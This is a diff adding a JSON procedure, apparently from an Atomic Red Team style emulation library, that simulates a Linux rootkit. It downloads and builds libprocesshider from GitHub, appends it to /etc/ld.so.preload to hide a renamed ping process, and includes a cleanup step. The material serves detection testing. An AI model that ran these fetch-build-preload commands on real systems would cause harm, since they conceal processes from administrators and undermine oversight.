@@ -1,0 +1,117 @@
+{
+  "id": "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3",
+  "name": "dynamic-linker based rootkit (libprocesshider)",
+  "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "70a97c37-65c5-4afb-99b2-f3340e8792e0",
+      "type": "execute-command",
+      "data": {
+        "command": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 \u003e/dev/null \u0026 pgrep -l evil_script.py || echo \"process hidden\"\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e8b80c9c-10e3-43a3-a07e-2c75ea438eff",
+      "type": "execute-command",
+      "data": {
+        "command": "sed -i \"\\:^#{library_path}:d\" /etc/ld.so.preload\nrm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8c451f59-fe25-4d80-902a-6704e224fc07",
+      "name": "Check dependency 1/1",
+      "description": "The preload library must exist on disk at specified location (#{library_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f93d3f0e-cc01-43a6-95a3-f63ef39fabdb",
+      "name": "Resolve dependency 1/1",
+      "description": "The preload library must exist on disk at specified location (#{library_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "mkdir -p /tmp/atomic \u0026\u0026 cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip \u0026\u0026 unzip #{rev}.zip \u0026\u0026 cd libprocesshider-#{rev}\nmake\ncp libprocesshider.so #{library_path}\ncp /usr/bin/ping /usr/local/bin/evil_script.py\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5e5919f7-3115-40f3-9cb1-c7bf61789076",
+      "name": "Re-check dependency 1/1",
+      "description": "The preload library must exist on disk at specified location (#{library_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "70a97c37-65c5-4afb-99b2-f3340e8792e0",
+      "p": "on-success",
+      "o": "e8b80c9c-10e3-43a3-a07e-2c75ea438eff"
+    },
+    {
+      "s": "70a97c37-65c5-4afb-99b2-f3340e8792e0",
+      "p": "on-failure",
+      "o": "e8b80c9c-10e3-43a3-a07e-2c75ea438eff"
+    },
+    {
+      "s": "8c451f59-fe25-4d80-902a-6704e224fc07",
+      "p": "on-success",
+      "o": "70a97c37-65c5-4afb-99b2-f3340e8792e0"
+    },
+    {
+      "s": "8c451f59-fe25-4d80-902a-6704e224fc07",
+      "p": "on-failure",
+      "o": "f93d3f0e-cc01-43a6-95a3-f63ef39fabdb"
+    },
+    {
+      "s": "f93d3f0e-cc01-43a6-95a3-f63ef39fabdb",
+      "p": "on-success",
+      "o": "5e5919f7-3115-40f3-9cb1-c7bf61789076"
+    },
+    {
+      "s": "5e5919f7-3115-40f3-9cb1-c7bf61789076",
+      "p": "on-failure",
+      "o": "70a97c37-65c5-4afb-99b2-f3340e8792e0"
+    }
+  ],
+  "tags": [
+    "T1014",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "repo",
+      "type": "string",
+      "description": "Url of the github repo zip",
+      "value": "https://github.com/gianlucaborello/libprocesshider/"
+    },
+    {
+      "name": "rev",
+      "type": "string",
+      "description": "Revision of the github repo zip",
+      "value": "25e0587d6bf2137f8792dc83242b6b0e5a72b415"
+    },
+    {
+      "name": "library_path",
+      "type": "string",
+      "description": "Full path of the library to add to ld.so.preload",
+      "value": "/usr/local/lib/libprocesshider.so"
+    }
+  ]
+}
